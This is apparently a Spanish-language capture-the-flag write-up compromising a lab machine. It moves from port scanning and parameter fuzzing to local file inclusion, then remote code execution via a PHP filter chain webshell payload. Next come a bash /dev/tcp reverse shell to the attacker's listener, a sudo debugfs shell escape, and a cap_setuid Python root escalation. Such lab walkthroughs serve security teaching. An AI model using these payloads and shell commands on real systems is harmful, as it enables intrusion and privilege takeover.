
# 1. Reconocimiento y enumeración

Comenzamos realizando un escaneo completo de puertos TCP:

```bash
sudo nmap -sS --min-rate 5000 -p- 172.17.0.2
```

Resultado:

```text
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

Tenemos dos servicios expuestos:

- **21/tcp** → FTP
- **80/tcp** → HTTP

Realizamos ahora una enumeración de versiones y scripts básicos:

```bash
nmap -sVC -p21,80 172.17.0.2
```

Resultado:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Hannah's Coffee
Service Info: OS: Unix
```

Por tanto:

```text
FTP  → vsftpd 3.0.5
HTTP → Apache 2.4.68 / Debian
```

El servicio HTTP será el principal punto de entrada.

---

# 2. Enumeración del servicio HTTP

Accedemos a la aplicación:

```bash
curl http://172.17.0.2
```

La página corresponde a:

```text
Hannah's Coffee
```

Entre los enlaces encontramos:

```html
<a href="index.php?page=home">Home</a>
<a href="index.php?page=menu">Menu</a>
<a href="index.php?page=about">About</a>
<a href="index.php?page=contact">Contact</a>
```

El parámetro:

```text
?page=home
```

es especialmente interesante porque los parámetros que reciben nombres de archivos o recursos pueden ser candidatos a vulnerabilidades de **Local File Inclusion (LFI)**.

---

# 3. Fuzzing de parámetros

Los primeros intentos de LFI utilizando `page` no producen el resultado esperado.

En lugar de asumir que `page` es el único parámetro interesante, utilizamos **FFUF** para realizar *parameter fuzzing*.

El objetivo es comprobar qué nombres de parámetros son procesados por `index.php`.

```bash
ffuf \
-u "http://172.17.0.2/index.php?FUZZ=test" \
-w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-fs 963
```

El filtro:

```text
-fs 963
```

elimina las respuestas con un tamaño de 963 bytes, que corresponde a la respuesta normal de la aplicación.

Encontramos:

```text
studio [Status: 200, Size: 637, Words: 145, Lines: 25]
```

Esto indica que `studio` es un parámetro que modifica el comportamiento de la aplicación.

---

# 4. Identificación del LFI

Probamos si el parámetro `studio` permite especificar un archivo local:

```bash
curl 'http://172.17.0.2/index.php?studio=/etc/passwd'
```

La respuesta contiene:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
hannah:x:1001:1001::/home/hannah:/bin/bash
```

Esto confirma que el valor proporcionado mediante `studio` está siendo utilizado por la aplicación para acceder a un archivo local.

Tenemos, por tanto:

```text
LFI confirmado
```

La vulnerabilidad permite leer archivos locales arbitrarios, pero inicialmente no conseguimos convertirla directamente en ejecución de código.

---

# 5. De LFI a RCE mediante PHP Filter Chain

## 5.1 Concepto

Una LFI no implica necesariamente ejecución de código.

En este caso podemos leer:

```text
/etc/passwd
```

pero necesitamos conseguir que PHP interprete contenido controlado por nosotros como código PHP.

Para ello utilizamos un **PHP Filter Chain**.

La técnica utiliza el wrapper:

```text
php://filter/
```

junto con una cadena de filtros de PHP, principalmente filtros `convert.*`, para transformar progresivamente los datos hasta obtener un payload PHP válido.

La construcción manual de estas cadenas sería extremadamente laboriosa, por lo que utilizamos:

**PHP Filter Chain Generator — Synacktiv**

Repositorio:

```text
https://github.com/synacktiv/php_filter_chain_generator
```

Clonamos el repositorio:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
```

Generamos una cadena utilizando como payload:

```php
<?php system($_GET["cmd"]); ?>
```

Comando:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

El generador devuelve una cadena de filtros extremadamente larga.

---

# 6. Explotación del LFI

La cadena generada se introduce como valor del parámetro vulnerable:

```text
studio=php://filter/[CADENA_GENERADA]
```

y añadimos el parámetro:

```text
cmd=id
```

La estructura conceptual de la petición es:

```text
/index.php?studio=php://filter/[PHP_FILTER_CHAIN]&cmd=id
```

El parámetro `cmd` coincide con el utilizado en nuestro payload:

```php
system($_GET["cmd"]);
```

Por tanto:

```text
cmd=id
   │
   ▼
$_GET["cmd"]
   │
   ▼
system("id")
   │
   ▼
ejecución del comando
```

La petición devuelve:

```text
id=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto confirma que hemos conseguido:

```text
LFI
  ↓
PHP Filter Chain
  ↓
RCE
  ↓
www-data
```

---

# 7. Reverse Shell

Aunque ya tenemos ejecución arbitraria de comandos, una shell interactiva resulta mucho más cómoda para continuar con la enumeración.

En nuestra máquina atacante ponemos un listener:

```bash
nc -lvnp 4444
```

Utilizamos el parámetro `cmd` para ejecutar una reverse shell:

```text
bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```

La petición debe estar correctamente codificada para URL.

Una vez ejecutada, obtenemos una shell:

```text
www-data@d2ed5c8fb477:/var/www/html$
```

Comprobamos nuestra identidad:

```bash
whoami
```

Resultado:

```text
www-data
```

Y:

```bash
id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tenemos una **shell interactiva como `www-data`**.

---

# 8. Escalada de privilegios: www-data → hannah

Una de las primeras comprobaciones después de obtener acceso a una máquina Linux es revisar los permisos `sudo`:

```bash
sudo -l
```

Obtenemos:

```text
Matching Defaults entries for www-data on 7c8de45b3d00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty

User www-data may run the following commands on 7c8de45b3d00:
    (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
```

Esto significa que `www-data` puede ejecutar:

```text
/sbin/debugfs -w /opt/hannah_disk.img
```

como el usuario:

```text
hannah
```

sin introducir contraseña.

La parte importante es:

```text
(hannah) NOPASSWD:
```

No obtenemos directamente una shell de root, pero sí podemos ejecutar un programa con la identidad de otro usuario.

---

# 9. Abuso de debugfs

`debugfs` es una herramienta destinada a interactuar directamente con sistemas de archivos ext2/ext3/ext4.

En este caso tenemos acceso de escritura:

```text
debugfs -w
```

sobre:

```text
/opt/hannah_disk.img
```

Ejecutamos:

```bash
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```

Una vez dentro de `debugfs`, comprobamos el contenido:

```text
debugfs: ls
```

Resultado:

```text
2  (12) .    2  (12) ..    11  (20) lost+found
13  (968) hannah_secret.txt
```

También podemos comprobar el directorio actual:

```text
debugfs: pwd
```

Resultado:

```text
[pwd]   INODE:      2  PATH: /
[root]  INODE:      2  PATH: /
```

`debugfs` dispone de comandos especiales que permiten ejecutar comandos externos. Utilizamos:

```text
debugfs: !bash
```

Esto ejecuta `bash` desde el contexto del proceso.

Como `debugfs` fue lanzado mediante:

```bash
sudo -u hannah
```

la shell resultante pertenece a `hannah`.

Obtenemos:

```text
hannah@7c8de45b3d00:/var/www/html$
```

Ya hemos conseguido:

```text
www-data
    ↓
sudo debugfs
    ↓
hannah
```

---

# 10. Enumeración de capabilities

Ahora que somos `hannah`, continuamos con la enumeración local.

Una comprobación habitual en Linux es buscar **file capabilities**:

```bash
getcap -r / 2>/dev/null
```

Encontramos:

```text
/opt/priv-python cap_setuid=ep
```

Este resultado es especialmente interesante.

---

# 11. Análisis de CAP_SETUID

Linux capabilities permiten dividir privilegios tradicionalmente asociados a `root` en permisos más específicos.

En este caso tenemos:

```text
CAP_SETUID
```

Esta capability permite a un proceso cambiar su UID.

El archivo tiene:

```text
cap_setuid=ep
```

donde:

```text
e = effective
p = permitted
```

Por tanto, la capability está disponible para el proceso al ejecutar el binario.

Comprobamos además los permisos tradicionales:

```bash
ls -l /opt/priv-python
```

Resultado:

```text
-rwxr-x--- 1 root hannah 6812336 Aug 6 08:46 /opt/priv-python
```

Podemos interpretarlo como:

```text
          owner       group       others
           rwx         r-x          ---
           │            │            │
          root        hannah       ninguno
```

En formato octal:

```text
750
```

Por tanto:

- `root` puede leer, escribir y ejecutar.
- Los miembros del grupo `hannah` pueden leer y ejecutar.
- El resto de usuarios no tiene permisos.

Como somos `hannah`, podemos ejecutar `/opt/priv-python`.

---

# 12. Explotación de CAP_SETUID

El binario parece ser una versión de Python con `CAP_SETUID`.

Podemos utilizar Python para solicitar un cambio de UID:

```python
import os
os.setuid(0)
```

El UID:

```text
0
```

corresponde a `root`.

Ejecutamos:

```bash
/opt/priv-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

La secuencia es:

```text
/opt/priv-python
       │
       ▼
Python ejecuta os.setuid(0)
       │
       ▼
UID efectivo = 0
       │
       ▼
os.system("/bin/bash")
       │
       ▼
shell con UID 0
```

Comprobamos:

```bash
whoami
```

Resultado:

```text
root
```

Y:

```bash
id
```

Resultado:

```text
uid=0(root) gid=1001(hannah) groups=1001(hannah)
```

Aunque el **GID** continúa siendo `hannah`, el proceso tiene:

```text
UID = 0
```

y, por tanto, disponemos de privilegios de `root`.

---

# 13. Root flag

Finalmente:

```bash
cat /root/root.txt
```

Resultado:

```text
dl{root_d5cc9d7538dc7c341cd96bba5a951520}
```

---